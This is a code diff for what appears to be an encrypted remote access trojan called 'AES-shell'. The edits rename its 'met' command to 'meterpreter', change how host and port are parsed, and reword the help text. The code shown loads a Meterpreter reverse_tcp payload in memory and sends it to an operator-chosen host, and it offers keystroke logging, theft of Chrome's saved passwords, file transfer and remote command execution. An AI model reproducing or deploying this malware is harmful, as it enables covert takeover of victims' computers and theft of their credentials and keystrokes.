@@ -159,16 +159,16 @@ while 1:
 		s.send(encrypted)
 		keydump = ''
 
-	elif decrypted.startswith("met "):
+	elif decrypted.startswith("meterpreter "):
 		try:
-			mhost,mport = decrypted.split(' ')[1], decrypted.split(' ')[2]
+			mhost,mport = decrypted.split(' ')[1].split(':')
 			MeterBin = MeterDrop(mhost, mport)
 			encrypted = EncodeAES(cipher, " [*] Meterpreter reverse_tcp sent to %s:%s**nEOFEOFEOFEOFEOFX" % (mhost, mport))
 			s.send(encrypted)
 			t = threading.Thread(target = ExecInMem, args = (MeterBin , ))
 			t.start()
 		except:
-			encrypted = EncodeAES(cipher, " [X] Failed to load meterpreter!**n  usage e.g: met 192.168.1.20 4444**nEOFEOFEOFEOFEOFX")
+			encrypted = EncodeAES(cipher, " [X] Failed to load meterpreter!**n  usage e.g: meterpreter 192.168.1.20 4444**nEOFEOFEOFEOFEOFX")
 			s.send(encrypted)
 
 	elif decrypted.startswith("download "):
@@ -280,7 +280,7 @@ def fnextcmd():
 				fnextcmd()
 
 	elif nextcmd == '?' or nextcmd == 'help':
-		print ' AES-shell options:**n  download filepath   -  Download a file from remote system to pwd**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n  met host port       -  Execute a reverse_tcp meterpreter to host:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n  chromepass          -  Retrieve chrome stored passwords. (windows)**n'
+		print '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n**n Windows Only:**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n  chromepass          -  Retrieve chrome stored passwords.**n'
 		fnextcmd()
 
 	elif nextcmd.startswith('download '):
@@ -292,7 +292,7 @@ def fnextcmd():
 		encrypted = EncodeAES(cipher, nextcmd)
 		s.send(encrypted)
 
-commands = ['download ', 'upload ', 'met ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass']
+commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help']
 readline.parse_and_bind("tab: complete")
 readline.set_completer(completer)
 BLOCK_SIZE = 32
@@ -312,12 +312,12 @@ s,address = c.accept()
 while True:
 	data = s.recv(1024)
 	decrypted = DecodeAES(cipher, data)
-	if decrypted.endswith("EOFEOFEOFEOFEOFX") == True:
+	if decrypted.endswith("EOFEOFEOFEOFEOFX"):
 		print decrypted[:-16]
 		fnextcmd()
 
 	elif decrypted.endswith("EOFEOFEOFEOFEOFY"):
-		print ' [*] AES-Encrypted connection established with %s:%s**n**n  AES-shell options:**n  download filepath   -  Download a file from remote system to pwd**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n  met host port       -  Execute a reverse_tcp meterpreter to host:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n  chromepass          -  Retrieve chrome stored passwords. (windows)**n' % (address[0],address[1])
+		print ' [*] AES-Encrypted connection established with %s:%s**n**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n**n Windows Only:**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n  chromepass          -  Retrieve chrome stored passwords.**n' % (address[0],address[1])
 		fnextcmd()
 
 	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):
